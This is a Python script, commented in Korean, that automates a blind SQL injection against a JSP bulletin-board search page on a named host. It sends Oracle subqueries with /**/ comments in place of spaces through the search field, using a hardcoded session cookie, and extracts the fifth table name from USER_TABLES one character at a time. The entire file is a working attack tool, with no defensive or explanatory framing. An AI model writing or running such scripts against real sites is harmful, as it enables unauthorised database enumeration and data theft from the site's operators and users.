import requests

# 기본 설정
url = "http://shanky.co.kr:38080/lhs/board/boardList4.jsp"
target_row = 5
found_name = "L"  # 이미 찾은 첫 글자
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$" # 대입할 문자들

# 세션 
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Cookie": "JSESSIONID=4C1653FC9C37F8190F26166530545257"
}

print(f"[*] 5번째 테이블 명 추출 시작...")

while True:
    found_flag = False
    for char in charset:
        test_name = found_name + char
        
        # 쿼리 구성 (공백은 /**/로 유지)
        payload = f"1'/**/AND/**/(SELECT/**/TABLE_NAME/**/FROM(SELECT/**/TABLE_NAME,rownum/**/RN/**/FROM/**/USER_TABLES)WHERE/**/RN={target_row})/**/LIKE/**/'{test_name}%"
        
        params = {
            "check1": ["SUBJECT", "WRITER", "CONTENTS"],
            "searchType": "ALL",
            "searchText": payload
        }
        
        try:
            response = requests.get(url, params=params, headers=headers)
            
            # 참(True) 판별 조건: 검색어 '1'에 해당하는 게시물(번호 4402)이 페이지에 존재하는지 확인
            if '4402' in response.text: 
                found_name += char
                print(f"[+] 찾은 문자열: {found_name}")
                found_flag = True
                break
        except Exception as e:
            print(f"[!] 에러 발생: {e}")
            break
            
    if not found_flag:
        print(f"[*] 추출 완료: {found_name}")
        break

print(f" 최종 테이블 명: {found_name}")